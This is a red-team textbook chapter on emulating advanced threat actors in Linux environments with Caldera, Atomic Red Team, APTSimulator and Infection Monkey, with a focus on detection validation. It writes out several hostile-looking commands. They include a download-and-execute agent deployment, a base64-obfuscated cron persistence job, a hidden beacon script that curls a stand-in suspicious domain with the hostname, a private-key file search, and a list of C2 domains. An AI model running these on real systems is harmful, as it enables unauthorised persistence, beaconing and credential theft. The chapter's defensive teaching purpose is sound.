# Chapter 24: Emulating Advanced Threat Actors

## Introduction to Threat Actor Emulation

While the previous chapter explored mapping individual tools to specific tactics and techniques, this chapter takes the next step: assembling these techniques into coherent, realistic adversary behaviors. Emulating advanced threat actors (sometimes called Advanced Persistent Threats or APTs) transforms isolated technical tests into comprehensive security assessments that reflect the true nature of sophisticated attacks.

Advanced threat actors operate with specific objectives, preferred techniques, and established patterns. By replicating these behaviors, red teams can provide a more realistic evaluation of an organization's defensive capabilities against the threats they are most likely to face. This approach moves beyond the question of "what vulnerabilities exist?" to the more valuable insight of "how would a real adversary exploit our environment?"

This chapter explores specialized frameworks designed specifically for threat actor emulation, providing structured approaches to simulate sophisticated adversaries in Linux environments.

![Threat actor emulation lifecycle](./images/threat_emulation_lifecycle.png)
*Figure 24.1: The threat actor emulation lifecycle, from intelligence gathering to execution*

## Caldera: Automated Adversary Emulation

CALDERA (Cyber Adversary Language and Operations Description Engine for Red team Automation) is an advanced open-source adversary emulation platform developed by MITRE. It automates adversary behaviors mapped to the MITRE ATT&CK framework, allowing red teams to execute coherent attack chains rather than isolated techniques.

### Core Concepts

Before diving into operational use, it's important to understand Caldera's key components:

1. **Abilities**: Individual ATT&CK techniques implemented as executable code
2. **Adversaries**: Collections of abilities arranged into attack chains
3. **Operations**: Executions of adversary profiles against target agents
4. **Agents**: Software deployed on target systems to execute abilities
5. **Facts**: Information discovered during operations that can be used in subsequent steps
6. **Planners**: Decision engines that determine the sequence of ability execution

This architecture enables Caldera to simulate adversaries that adapt to the target environment, much like real threat actors would.

### Installation and Setup

Caldera requires Python 3.7+ and can run on various Linux distributions, including Kali and Parrot OS:

```bash
# Clone the repository
git clone https://github.com/mitre/caldera.git
cd caldera

# Install dependencies
pip3 install -r requirements.txt

# Install optional plugins for additional capabilities
pip3 install -r plugins/requirements.txt

# Start the server
python3 server.py --insecure
```

Access the web interface at `http://localhost:8888` with the default credentials (red/admin).

#### Configuring Server Settings

Before running operations, modify the configuration file for your environment:

```bash
# Edit the default configuration
nano conf/default.yml

# Key settings to adjust:
# - api_key: Change default API keys
# - exfil_dir: Location for exfiltrated files
# - plugins: Enable additional capabilities
```

### Deploying Agents

Agents are the execution clients that run on target systems. Caldera supports multiple agent types for Linux environments:

#### Sandcat Agent (Default)

```bash
# Generate deployment command in the Caldera web UI:
# Navigate to Agents → Deploy an Agent

# Example deployment command for Linux
curl -s -X POST -H "file:sandcat.go" -H "platform:linux" http://192.168.1.100:8888/file/download > sandcat.go && chmod +x sandcat.go && ./sandcat.go -server http://192.168.1.100:8888 -group red
```

#### Manx Agent (SSH-based)

For Linux environments where you have SSH access but can't deploy persistent agents:

```bash
# In the Caldera web UI:
# 1. Navigate to Plugins → Manx
# 2. Configure SSH credentials and target
# 3. Click "Connect"
```

This creates a lightweight, non-persistent agent using existing SSH channels.

### Creating Adversary Profiles

While Caldera includes predefined adversary profiles, creating custom profiles based on specific threat actors provides more relevant testing:

```bash
# In the Caldera web UI:
# 1. Navigate to Adversaries
# 2. Click "New Adversary"
# 3. Configure the following:
#    - Name: (e.g., "APT29_Emulation")
#    - Description: Purpose and references
#    - Abilities: Select techniques from each tactic
```

The key to effective adversary emulation is selecting abilities that match the documented behaviors of the threat actor you're emulating. Focus on:

1. Initial access techniques (how they typically gain entry)
2. Persistence mechanisms they prefer
3. Privilege escalation methods they commonly use
4. Their favored lateral movement approaches
5. Typical exfiltration techniques

![Caldera adversary creation](./images/caldera_adversary.png)
*Figure 24.2: Creating a custom adversary profile in Caldera*

### Example: Linux-focused APT Emulation

Here's an example of building an adversary profile focused on Linux environments:

**Adversary: Linux_Server_Infiltrator**

1. **Initial Access**:
   - Web Shell Upload (T1100)
   - Valid Accounts (T1078)

2. **Discovery**:
   - File and Directory Discovery (T1083)
   - System Information Discovery (T1082)
   - Account Discovery (T1087)

3. **Privilege Escalation**:
   - Exploitation for Privilege Escalation (T1068)
   - Sudo Techniques (T1548.003)

4. **Persistence**:
   - Cron Jobs (T1053.003)
   - Systemd Services (T1543.002)
   - SSH Keys (T1098.004)

5. **Lateral Movement**:
   - SSH (T1021.004)
   - Pass the Hash (T1550.002)

6. **Collection & Exfiltration**:
   - Data from Local System (T1005)
   - Exfiltration Over Alternative Protocol (T1048)

### Operation Configuration

Operations execute adversary profiles against specific agents. Configure operations to match your assessment objectives:

```bash
# In the Caldera web UI:
# 1. Navigate to Operations
# 2. Click "Start New Operation"
# 3. Configure operation parameters:
#    - Name: Descriptive name for reports
#    - Adversary: Select custom or built-in profile
#    - Group: Target agent group
#    - Planner: Algorithm for ability execution
#    - (Optional) Configure additional parameters
# 4. Start the operation
```

#### Planner Selection

Caldera offers multiple planners that affect how abilities are executed:

| Planner | Description | Best Used For |
|---------|-------------|---------------|
| Atomic | Executes all abilities in sequence | Simple attack chains |
| Batch | Groups abilities by tactic | Phased operations |
| Buckets | Executes abilities by bucket/category | Custom groupings |
| Chain | Uses fact dependencies to build dynamic chains | Realistic operations |

For advanced threat emulation, the Chain planner provides the most realistic behavior, as it dynamically adapts based on information discovered during the operation.

```bash
# When selecting the Chain planner, you can set:
# - Fact dependencies: What information must be gathered before proceeding
# - Branching logic: Alternative paths based on discovered facts
# - Success criteria: When to consider an objective achieved
```

### Running Complete Adversary Profiles

To execute a full red team operation using Caldera:

1. **Preparation Phase**
   - Deploy agents to target systems
   - Create or select appropriate adversary profile
   - Configure operation parameters

2. **Execution Phase**
   - Start the operation
   - Monitor execution in real-time
   - Observe fact collection and ability execution

3. **Analysis Phase**
   - Review operation results
   - Analyze success and failure points
   - Identify detection opportunities

```bash
# Example of analyzing operation results
# In the Caldera web UI:
# 1. Navigate to Operations
# 2. Select completed operation
# 3. Review the event timeline
# 4. Export results for reporting
```

#### Example Operation: Data Extraction

This example demonstrates a complete Caldera operation targeting sensitive data:

```bash
# 1. Configure a Linux_Data_Thief adversary with these abilities:
#    - Discovery: File and directory enumeration
#    - Collection: Identify sensitive files
#    - Exfiltration: Transfer data to staging server

# 2. Launch operation with Chain planner
#    - Set target: Linux servers group
#    - Configure exfiltration parameters
#    - Enable OPSEC constraints (realistic timing)

# 3. During operation, Caldera will:
#    - Discover file system structure
#    - Locate sensitive files based on extensions (.key, .conf, etc.)
#    - Exfiltrate data while evading detection mechanisms
```

### Detection Opportunities

For blue teams, Caldera operations provide valuable detection opportunities:

| Tactic | Detection Opportunity | Log Source |
|--------|------------------------|------------|
| Initial Access | Agent deployment | Process creation, network connections |
| Discovery | Unusual system commands | Command history, process monitoring |
| Privilege Escalation | Exploitation attempts | Authorization logs, SUID executions |
| Persistence | New cron jobs, services | File monitoring, service creation |
| Exfiltration | Unusual outbound connections | Network flows, DNS queries |

> **RED TEAM TIP:**
>
> When running Caldera operations, create a detection matrix that maps each ability to expected detection opportunities. After the operation, compare with actual detections to identify defensive gaps. This creates a valuable feedback loop for both offensive and defensive teams.

### Customizing Abilities for Linux Environments

While Caldera includes many Linux-focused abilities, creating custom abilities enhances realism for your specific target environment:

```bash
# Create a custom ability (manual process)
# 1. Navigate to Abilities
# 2. Click "Add Ability"
# 3. Configure ability parameters:
#    - Name and description
#    - ATT&CK mapping
#    - Command to execute
#    - Parser for output

# Example Linux command for sensitive file discovery:
find /home -type f -name "*.key" -o -name "id_rsa" -o -name "*.pem" 2>/dev/null
```

For more complex abilities, you can develop custom plugins that extend Caldera's functionality:

```python
# Basic structure of a custom ability plugin
class CustomPlugin(Plugin):
    def __init__(self, services):
        super().__init__(services)
        self.name = 'my_custom_plugin'
        
    async def execute_custom_ability(self, agent, command):
        # Implementation specific to your environment
        return await agent.execute(command)
```

### Limitations and Considerations

While Caldera is powerful, be aware of these limitations in Linux environments:

1. **Agent Compatibility**: Some abilities may only work with specific agent types
2. **Privilege Requirements**: Many Linux techniques require root/sudo access
3. **Detection Footprint**: Agent deployment may trigger security controls
4. **Environment Specificity**: Some abilities assume specific Linux distributions or configurations

**Operational Security Considerations:**

```bash
# 1. Use standalone mode for sensitive environments
./caldera-client --server http://192.168.1.100:8888 --operation OPERATION_ID

# 2. Implement cleanup procedures for agents
# In the Caldera web UI:
# Operations → [Your Operation] → Cleanup

# 3. Limit execution to non-production environments initially
```

## Atomic Red Team: Test Case Execution

While Caldera provides an automated framework, Atomic Red Team takes a more modular approach through individual test cases for specific ATT&CK techniques. Developed by Red Canary, Atomic Red Team offers a library of small, focused tests that can be executed independently.

### Core Concepts

Atomic Red Team organizes tests as "atomics" - individual, executable tests mapped to specific ATT&CK techniques. Each atomic includes:

1. **Description**: What the test does and which technique it validates
2. **Input Arguments**: Parameters that can be customized
3. **Execution**: The actual commands to run
4. **Cleanup**: Commands to restore the system to its original state

This granular approach allows for precise testing of detection capabilities for specific techniques.

### Installation

For Linux environments, Atomic Red Team can be used with its native CLI tool or directly from the repository:

```bash
# Clone the repository
git clone https://github.com/redcanaryco/atomic-red-team.git
cd atomic-red-team

# Install AtomicRedTeam PowerShell module (if using PowerShell on Linux)
pwsh -c "Install-Module -Name AtomicRedTeam -Scope CurrentUser -Force"

# Alternatively, use the Python-based execution framework
pip install -r requirements.txt
```

### Running Individual Atomic Tests

Atomic tests can be executed directly from the command line:

```bash
# Navigate to the technique directory
cd atomic-red-team/atomics/T1053.003/

# Review available tests
cat T1053.003.yaml

# Execute a specific test (example: cron persistence)
bash -c "$(cat T1053.003.yaml | grep -A 20 'executor: bash' | grep 'command:' | head -n 1 | cut -d':' -f2-)"
```

For more structured execution, use the Atomic Red Team execution frameworks:

```bash
# Using the PowerShell framework
pwsh -c "Import-Module AtomicRedTeam; Invoke-AtomicTest T1053.003 -TestNumbers 1"

# Using the Python-based framework
python atomics.py run T1053.003 --test-numbers 1
```

### Example: Validating Detection Capabilities

Here's a comprehensive example of using Atomic Red Team to validate Linux detection capabilities:

1. **Select Techniques to Test**:
   - Persistence via cron jobs (T1053.003)
   - User account creation (T1136.001)
   - SSH key persistence (T1098.004)
   - Data exfiltration over DNS (T1048.003)

2. **Execute Atomic Tests Sequentially**:

```bash
# 1. Test cron job persistence
python atomics.py run T1053.003 --test-numbers 1

# 2. Test local user account creation
python atomics.py run T1136.001 --test-numbers 1

# 3. Test SSH key persistence
python atomics.py run T1098.004 --test-numbers 1

# 4. Test DNS exfiltration
python atomics.py run T1048.003 --test-numbers 1
```

3. **Verify Detection**:
   - Check SIEM alerts for each executed technique
   - Review endpoint detection tool alerts
   - Validate log collection and analysis

4. **Cleanup After Testing**:

```bash
# Run cleanup for all executed tests
python atomics.py cleanup T1053.003 --test-numbers 1
python atomics.py cleanup T1136.001 --test-numbers 1
python atomics.py cleanup T1098.004 --test-numbers 1
python atomics.py cleanup T1048.003 --test-numbers 1
```

### Creating Custom Atomic Tests

For Linux-specific scenarios, creating custom atomic tests ensures relevance to your environment:

```yaml
# Example custom atomic test for T1053.003 (Cron)
- name: Custom Cron Persistence with Base64 Encoding
  auto_generated_guid: 12345678-90ab-cdef-1234-567890abcdef
  description: |
    Creates a cron job that executes a base64-encoded command to evade string-based detection
  supported_platforms:
    - linux
  executor:
    name: bash
    elevation_required: true
    command: |
      echo "*/5 * * * * echo ZWNobyAiaGFja2VkIiA+IC90bXAvaGFja2VkCg== | base64 -d | bash" | crontab -
    cleanup_command: |
      crontab -r
```

Save this as a YAML file and use it with the Atomic Red Team framework:

```bash
# Execute custom test
python atomics.py run /path/to/custom_atomics.yaml
```

### Creating Comprehensive Test Suites

For thorough detection validation, create test suites that cover complete attack chains:

```bash
# Create a test suite script (test_suite.sh)
cat > test_suite.sh << 'EOF'
#!/bin/bash
# Initial Access and Discovery Phase
echo "[+] Testing Initial Access and Discovery"
python atomics.py run T1087.001 # Account Discovery
python atomics.py run T1082 # System Information Discovery
python atomics.py run T1083 # File and Directory Discovery

# Persistence Phase
echo "[+] Testing Persistence Mechanisms"
python atomics.py run T1136.001 # Create Account
python atomics.py run T1053.003 # Scheduled Task/Job - Cron
python atomics.py run T1543.002 # Create or Modify System Process - Systemd Service

# Privilege Escalation Phase
echo "[+] Testing Privilege Escalation"
python atomics.py run T1548.003 # Abuse Elevation Control Mechanism - Sudo
python atomics.py run T1068 # Exploitation for Privilege Escalation

# Collection and Exfiltration Phase
echo "[+] Testing Collection and Exfiltration"
python atomics.py run T1005 # Data from Local System
python atomics.py run T1048.003 # Exfiltration Over Alternative Protocol - DNS

# Cleanup Phase
echo "[+] Cleaning up tests"
python atomics.py cleanup T1087.001 T1082 T1083 T1136.001 T1053.003 T1543.002 T1548.003 T1068 T1005 T1048.003
EOF

chmod +x test_suite.sh
./test_suite.sh
```

This script executes a complete attack chain and validates detection at each stage.

> **RED TEAM TIP:**
>
> For maximum detection coverage, run Atomic tests during different operational states: business hours, overnight, during backup windows, etc. This identifies detection gaps that might exist only during certain operational conditions.

### Integration with CI/CD Pipelines

For continuous detection validation, integrate Atomic Red Team into CI/CD pipelines:

```yaml
# Example GitLab CI configuration (.gitlab-ci.yml)
stages:
  - test

security_detection_testing:
  stage: test
  script:
    - git clone https://github.com/redcanaryco/atomic-red-team.git
    - cd atomic-red-team
    - pip install -r requirements.txt
    - python atomics.py run T1053.003 T1136.001 T1543.002
    - sleep 300  # Allow time for detection
    - curl -X GET "https://siem-api.internal/alerts?last=10m" -H "Authorization: Bearer $API_TOKEN" > alerts.json
    - python validate_detections.py alerts.json
  only:
    - schedules
```

This approach automates regular testing of detection capabilities against common attack techniques.

## APTSimulator: Quick APT Simulation

APTSimulator provides a lightweight approach to threat simulation, focusing on generating artifacts and behaviors commonly associated with advanced persistent threats. Unlike the more complex frameworks, APTSimulator is designed for rapid deployment and artifact generation.

### Core Concepts

APTSimulator takes a different approach from Caldera and Atomic Red Team:

1. **Artifact Generation**: Creates files, registry entries, and other indicators
2. **Behavioral Simulation**: Mimics adversary behaviors without executing actual exploits
3. **Detection Testing**: Validates alerting on common threat indicators
4. **Low Overhead**: Designed for quick execution without complex infrastructure

This makes it ideal for baseline testing of detection systems without the complexity of full operational frameworks.

### Installation

While APTSimulator was originally Windows-focused, a Linux version called APTSimulator-Linux exists:

```bash
# Clone the repository
git clone https://github.com/NextronSystems/APTSimulator-Linux.git
cd APTSimulator-Linux

# Set execution permissions
chmod +x apt-simulator.sh
```

### Basic Usage

APTSimulator is designed for simplicity:

```bash
# Show available simulation modules
./apt-simulator.sh --list

# Run all simulation modules
sudo ./apt-simulator.sh --all

# Run specific modules
sudo ./apt-simulator.sh --module WEBSHELL --module C2
```

### Example: Generating Artifacts of Known Threat Actors

To simulate a specific threat actor's artifacts:

```bash
# Create a custom threat actor profile
cat > lazarus-profile.conf << EOF
# Lazarus Group (North Korea) simulation profile
ENABLE_WEBSHELL=1
WEBSHELL_LOCATIONS="/var/www/html /var/www/html/wp-content"
ENABLE_BACKDOOR=1
BACKDOOR_LOCATIONS="/usr/local/bin /tmp"
ENABLE_C2=1
C2_DOMAINS="github.microsoft.key.akadns.org github.cloudfront.download.com"
ENABLE_DATA_STAGED=1
DATA_LOCATIONS="/tmp /var/tmp"
EOF

# Run the simulation with the custom profile
sudo ./apt-simulator.sh --config lazarus-profile.conf
```

This creates artifacts specifically associated with the Lazarus Group's tactics.

### Key Simulation Modules

APTSimulator-Linux includes several modules relevant for Linux environments:

#### Web Shell Artifacts

```bash
# Manual execution of the web shell module
sudo ./apt-simulator.sh --module WEBSHELL

# What it creates:
# - PHP/JSP web shells in common web directories
# - Realistic timestamps to avoid obvious detection
# - Common web shell variants used by APT groups
```

#### C2 Communication Simulation

```bash
# Execute C2 simulation
sudo ./apt-simulator.sh --module C2

# What it does:
# - Creates DNS queries to known C2 domains
# - Establishes connections to suspicious IPs
# - Generates unusual network traffic patterns
```

#### Data Collection and Staging

```bash
# Simulate data staging behavior
sudo ./apt-simulator.sh --module DATA_STAGED

# What it creates:
# - Collections of "sensitive" files in staging locations
# - Compressed archives ready for exfiltration
# - Access patterns similar to data theft operations
```

#### Persistence Mechanisms

```bash
# Simulate persistence creation
sudo ./apt-simulator.sh --module PERSISTENCE

# What it creates:
# - Cron jobs for persistence
# - Startup scripts
# - User account modifications
```

### Customizing Simulation Scenarios

For more realistic testing, customize the simulation to match specific threat actors:

```bash
# Create a custom module for a specific technique
cat > custom_module.sh << 'EOF'
#!/bin/bash
# Custom APT simulation module
echo "[+] Executing custom APT simulation"

# Create suspicious SSH keys
mkdir -p /tmp/.ssh/
echo "ssh-rsa AAAAB3NzaC1yc2EAAAADAQ..." > /tmp/.ssh/authorized_keys

# Create memory resident payload (simulated)
echo '#!/bin/bash
while true; do
  curl -s https://suspicious.domain/check.php?id=$(hostname)
  sleep 300
done' > /tmp/.svchost
chmod +x /tmp/.svchost

# Start the simulated backdoor
nohup /tmp/.svchost >/dev/null 2>&1 &

echo "[+] Custom simulation completed"
EOF

chmod +x custom_module.sh

# Add to APTSimulator
cp custom_module.sh APTSimulator-Linux/modules/
```

Then update the main script to include your custom module.

### Generating Comprehensive APT Campaigns

For full threat actor emulation, combine multiple modules into a campaign:

```bash
# Create an APT campaign script
cat > apt_campaign.sh << 'EOF'
#!/bin/bash
echo "[+] Starting APT campaign simulation"

# Phase 1: Initial Access
./apt-simulator.sh --module WEBSHELL

# Phase 2: Persistence
./apt-simulator.sh --module PERSISTENCE

# Phase 3: Discovery
./apt-simulator.sh --module DISCOVERY

# Phase 4: Collection
./apt-simulator.sh --module DATA_STAGED

# Phase 5: Command and Control
./apt-simulator.sh --module C2

echo "[+] APT campaign simulation completed"
EOF

chmod +x apt_campaign.sh
```

### Cleaning Up Simulations

After testing, clean up the artifacts:

```bash
# Run the cleanup functionality
sudo ./apt-simulator.sh --cleanup

# Verify removal of artifacts
find /tmp -name ".*" -type f
find /var/www -name "*.php" -mtime -1
```

> **RED TEAM TIP:**
>
> For maximum value, run APTSimulator before more complex emulation exercises. This establishes a baseline for detection capabilities against simple artifacts before progressing to sophisticated attack chains with Caldera or custom tools.

## Infection Monkey: Data Center Security Testing

Infection Monkey is an open-source breach and attack simulation tool that focuses specifically on testing data center and cloud environments. It's particularly valuable for evaluating segmentation, lateral movement paths, and zero-trust implementations.

### Core Concepts

Infection Monkey consists of two main components:

1. **Monkey Island**: Command and control server that manages the simulation
2. **Agents (Monkeys)**: Deployment units that simulate attack techniques

The framework is designed to safely test:

- Network segmentation effectiveness
- Lateral movement opportunities
- Credential strength and reuse
- Zero-trust architecture implementation
- Container escape vulnerabilities

### Installation

Infection Monkey can be installed using Docker for the most consistent experience:

```bash
# Pull the Docker image
docker pull guardicore/monkey-island:latest

# Run the Monkey Island server
docker run --name monkey-island -d -p 5000:5000 guardicore/monkey-island:latest
```

Access the web interface at `https://localhost:5000` and follow the setup wizard.

### Basic Configuration

Before running a simulation, configure the environment parameters:

```bash
# Via the web interface:
# 1. Navigate to "Configuration"
# 2. Set simulation parameters:
#    - Internal networks to scan
#    - Excluded IPs/segments
#    - Exploitation techniques to use
#    - Scan depth and timing
# 3. Save the configuration
```

Key configuration sections include:

1. **Basic Settings**: Simulation scope and timing
2. **Network**: Target networks and boundaries
3. **Exploits**: Which vulnerabilities to attempt
4. **Credentials**: Test credentials to attempt

### Example: Testing Zero-Trust Architecture

Zero-trust models assume breach and verify every access request. Testing this architecture with Infection Monkey helps validate implementation:

```bash
# 1. Configure Infection Monkey for zero-trust testing:
#    - Enable all internal network scanning
#    - Enable credential reuse checks
#    - Enable lateral movement techniques
#    - Configure network segmentation tests

# 2. Deploy an agent in a minimally privileged segment
# Via the web interface:
# "Run Monkey" → "Manual" → Get the Linux deployment command

# 3. Monitor propagation attempts
# The agent will attempt to:
#    - Discover network resources
#    - Move laterally using discovered credentials
#    - Exploit vulnerabilities for privilege escalation
#    - Test network boundaries
```

After the simulation completes, review the Zero-Trust report that highlights:

- Excessive network paths between segments
- Credential reuse vulnerabilities
- Unnecessary network visibility
- Authentication bypass opportunities

### Lateral Movement Testing

A key strength of Infection Monkey is its ability to test lateral movement paths:

```bash
# Configure for lateral movement focus:
# 1. Enable SSH exploits
# 2. Enable credential reuse
# 3. Set propagation depth to maximum
# 4. Configure test credentials

# Deploy in a development environment
# Monitor propagation to production or sensitive segments
```

The resulting report will show:

- Complete propagation maps
- Successful lateral movement techniques
- Credential effectiveness
- Jump points between network segments

![Infection Monkey Propagation Map](./images/infection_monkey_map.png)
*Figure 24.3: Infection Monkey lateral movement map showing successful propagation paths*

### Segmentation Testing

For data centers, network segmentation is critical. Infection Monkey can validate segmentation effectiveness:

```bash
# Configure segmentation testing:
# 1. Define network segments in configuration
#    - Development segment: 10.1.0.0/24
#    - Production segment: 10.2.0.0/24
#    - Database segment: 10.3.0.0/24

# 2. Deploy agents in multiple segments
#    - Start in lowest security segment
#    - Enable full scanning capabilities
#    - Set aggressive propagation options

# 3. Review segmentation findings
#    - Unexpected network paths
#    - Firewall rule gaps
#    - Inadequate access controls
```

### Linux-Specific Exploitation

Infection Monkey includes several Linux-focused exploitation techniques:

1. **SSH Exploits**:
   - Password brute forcing
   - Key-based authentication
   - Known vulnerability exploitation

2. **Vulnerability Exploitation**:
   - Shellshock (CVE-2014-6271)
   - Sambacry (CVE-2017-7494)
   - Elasticsearch (CVE-2015-1427)

3. **Container Escapes**:
   - Docker socket abuse
   - Kernel vulnerability exploitation
   - Privileged container escapes

Configure which techniques to use based on your environment:

```bash
# Via the web interface:
# "Configuration" → "Exploits" → Enable specific Linux exploits
```

### Example: Container Security Assessment

For environments using containers, Infection Monkey can test container security:

```bash
# 1. Configure container testing:
#    - Enable Docker techniques
#    - Enable container escape exploits
#    - Configure scanning for container infrastructure

# 2. Deploy an agent within a container
#    - Execute the deployment command inside a container
#    - Or use the web interface to generate a Docker-specific deployment

# 3. Analyze container security findings:
#    - Container escape opportunities
#    - Cross-container communication paths
#    - Excessive container privileges
#    - Host resource access
```

### Integration with Security Tools

Infection Monkey can integrate with existing security infrastructure to validate detection capabilities:

```bash
# 1. Configure your SIEM and EDR tools for alert collection
# 2. Run a comprehensive Infection Monkey simulation
# 3. Compare generated alerts with Monkey activity
# 4. Identify detection gaps for each technique
```

This creates a valuable feedback loop between simulated attacks and detection capabilities.

### Custom Exploitation Modules

Advanced users can extend Infection Monkey with custom exploitation modules:

```python
# Example skeleton for a custom Linux exploit module
class MyCustomExploit(HostExploiter):
    _TARGET_OS_TYPE = OperatingSystemType.LINUX
    
    def __init__(self):
        super(MyCustomExploit, self).__init__()
        self._attack_type = "custom"
        
    def exploit_host(self):
        # Custom exploitation logic here
        try:
            # Attempt exploitation
            return True
        except Exception:
            return False
```

Add custom modules to test organization-specific vulnerabilities or unique infrastructure components.

> **RED TEAM TIP:**
>
> When using Infection Monkey in production environments, always:
> 1. Schedule simulations during maintenance windows
> 2. Start with minimal exploitation settings and gradually increase
> 3. Exclude critical production systems initially
> 4. Alert IT operations before running simulations
> 5. Have a rollback plan in case of unexpected impact

## Building a Comprehensive Threat Emulation Program

While individual frameworks provide powerful capabilities, a comprehensive threat emulation program combines multiple approaches to provide thorough security validation.

### Phased Implementation Approach

For organizations new to threat emulation, implement a phased approach:

1. **Initial Phase**: Start with static artifact generation (APTSimulator)
   - Generate basic threat indicators
   - Validate fundamental detection capabilities
   - Build confidence in the process

2. **Intermediate Phase**: Progress to technique validation (Atomic Red Team)
   - Test specific techniques mapped to likely threats
   - Validate detection for individual ATT&CK techniques
   - Refine detection rules and alerting

3. **Advanced Phase**: Implement end-to-end scenarios (Caldera, Infection Monkey)
   - Execute complete attack chains
   - Test sophisticated threat actor behaviors
   - Validate holistic defense capabilities

4. **Mature Phase**: Develop custom emulation plans
   - Create organization-specific threat scenarios
   - Combine multiple tools for comprehensive assessments
   - Automate regular testing as part of security operations

### Tool Selection Matrix

Choose the right tool for specific testing objectives:

| Testing Objective | Recommended Tool | Alternative |
|-------------------|------------------|------------|
| Detection Validation | Atomic Red Team | APTSimulator |
| End-to-End Attack Chains | Caldera | Custom Scripts |
| Network Segmentation | Infection Monkey | Custom Network Testing |
| Zero-Trust Validation | Infection Monkey | Caldera |
| Specific Threat Actor | Caldera | APTSimulator + Custom Scripts |
| Regular Automated Testing | Atomic Red Team | Caldera (automated ops) |

### Creating a Threat Intelligence-Driven Approach

For maximum value, base emulation on specific threat intelligence:

1. **Identify Relevant Threat Actors**:
   - Which groups target your industry?
   - What attack methods do they use?
   - What are their typical objectives?

2. **Map Techniques to ATT&CK**:
   - Identify the specific techniques used by each actor
   - Prioritize techniques based on prevalence and impact
   - Create a heat map of most critical techniques

3. **Develop Emulation Plans**:
   - Create plans specific to each prioritized threat actor
   - Include realistic TTPs based on intelligence
   - Design scenarios that reflect actual campaigns

```bash
# Example of a threat-intel driven test plan

# 1. Threat actor identification: APT29 (financial services focus)
# 2. Key techniques identified:
#    - Spearphishing (T1566.001)
#    - PowerShell/Bash scripting (T1059.001/T1059.003)
#    - Credential dumping (T1003)
#    - Scheduled tasks (T1053)
#    - Custom C2 protocols (T1071)

# 3. Emulation plan execution:
#    - Use Atomic Red Team for individual technique validation
#    - Deploy Caldera with custom APT29 adversary profile
#    - Validate detection across the technique chain
```

### Example: Full-Spectrum Threat Emulation Exercise

This example demonstrates how to combine multiple frameworks for comprehensive testing:

```bash
#!/bin/bash
# combined_emulation.sh - Comprehensive threat emulation

echo "[+] Starting comprehensive threat emulation exercise"

# Phase 1: Generate basic artifacts with APTSimulator
echo "[+] Generating baseline threat artifacts"
./apt-simulator.sh --module WEBSHELL --module C2 --module PERSISTENCE

# Phase 2: Execute key atomic tests
echo "[+] Executing atomic technique tests"
cd atomic-red-team
python atomics.py run T1053.003 T1136.001 T1548.003 T1087.001

# Phase 3: Run Caldera operation
echo "[+] Launching Caldera operation"
curl -X POST "http://localhost:8888/api/rest" \
  -H "KEY: ADMIN123" \
  -d '{"index":"operations", "name":"Combined_Exercise", "adversary_id":"APT29", "group":"red", "planner":"chain"}'

# Phase 4: Execute Infection Monkey for lateral movement
echo "[+] Deploying Infection Monkey agent"
curl -X POST "https://localhost:5000/api/monkey" \
  -H "Content-Type: application/json" \
  -d '{"command":"linux", "propagation":"depth", "exploits":"all"}' -k

echo "[+] Threat emulation exercise running"
echo "[+] Check respective dashboards for results"
```

### Measuring Effectiveness

To evaluate the effectiveness of your threat emulation program:

1. **Detection Coverage**:
   - What percentage of emulated techniques were detected?
   - Which phases of the attack chain had detection gaps?
   - How quickly were techniques detected?

2. **Response Effectiveness**:
   - Were alerts properly prioritized?
   - Did response procedures activate appropriately?
   - How quickly were simulated threats contained?

3. **Defense Improvements**:
   - What specific detection gaps were identified?
   - Which defensive controls need enhancement?
   - Are there architectural changes needed?

Document findings in a structured format:

```markdown
# Threat Emulation Exercise Results

## Exercise Details
- Date: 2023-06-15
- Scope: Finance Department Systems
- Emulated Threat: APT29
- Tools Used: Caldera, Atomic Red Team, Custom Scripts

## Detection Results
- Techniques Executed: 24
- Techniques Detected: 19 (79%)
- Average Detection Time: 18 minutes

## Critical Gaps
1. PowerShell script execution not detected (T1059.001)
2. SSH key persistence not alerting (T1098.004)
3. Data exfiltration via DNS not detected (T1048.003)

## Recommendations
1. Implement PowerShell logging and script block monitoring
2. Deploy file integrity monitoring for SSH configuration
3. Enhance DNS monitoring for data exfiltration patterns
```

## Conclusion

Advanced threat emulation transforms traditional penetration testing into realistic adversary simulation, providing much deeper insight into security effectiveness. By using specialized frameworks like Caldera, Atomic Red Team, APTSimulator, and Infection Monkey, red teams can precisely validate how well an organization would fare against real-world attackers.

The key to successful threat emulation is combining technical tool expertise with threat intelligence insights. Understanding not just how to use these frameworks, but which techniques to prioritize based on relevant threat actors, creates truly valuable security assessments.

As you incorporate these tools into your red team methodology, remember that the ultimate goal isn't just finding vulnerabilities—it's validating that your organization can detect and respond to the specific threats you're most likely to face.

In the next chapter, we'll explore specialized security testing for cloud environments, examining tools and techniques specifically designed for assessing cloud security postures.

## Additional Resources

- [MITRE Caldera Documentation](https://caldera.readthedocs.io/)
- [Red Canary Atomic Red Team Framework](https://github.com/redcanaryco/atomic-red-team)
- [APTSimulator Documentation](https://github.com/NextronSystems/APTSimulator)
- [Infection Monkey Documentation](https://www.guardicore.com/infectionmonkey/)
- [MITRE ATT&CK Evaluations](https://attackevals.mitre-engenuity.org/)
- [Threat Emulation Plans by CTID](https://github.com/center-for-threat-informed-defense/adversary_emulation_library)
- [Sigma Rules for Detection](https://github.com/SigmaHQ/sigma)
- [SANS Advanced Threat Emulation Course](https://www.sans.org/cyber-security-courses/advanced-threat-emulation-red-team-operations/)
